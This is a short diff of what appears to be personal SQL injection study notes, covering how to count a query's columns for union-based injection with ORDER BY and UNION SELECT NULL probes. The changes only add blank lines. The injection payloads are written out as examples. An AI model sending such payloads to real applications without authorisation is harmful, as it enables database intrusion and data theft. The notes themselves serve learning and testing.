@@ -11,11 +11,13 @@ look for syntax errors<br/>
 <br/><br/>
 2. **Union based**<br/>
 Counting number of columns 2methods <br/>
+
 a. **orderby** (increase the number 1,2,3 so on no error means the number of columns exists if error columns count end ex: ( order by 1--)   --> no error 1columns present, ( order by 2 ) --> no errors 2 columns present, ( order by 3 ) --> error 3 no column present--> so the total columns is 2)
   ' ORDER BY 1--<br/>
   ' ORDER BY 2--<br/>
   ' ORDER BY 3--<br/>
   <br/>
+  
 b. **null based** (go on increasing null values comma separated, at total number of columns no error until you will get errors ex: (' UNION SELECT NULL--) -->error, (' UNION SELECT NULL,NULL--) -->no error--> it means the total number of columns are 2, (' UNION SELECT NULL,NULL,NULL--)-->error)
   ' UNION SELECT NULL--<br/>
   ' UNION SELECT NULL,NULL--<br/>
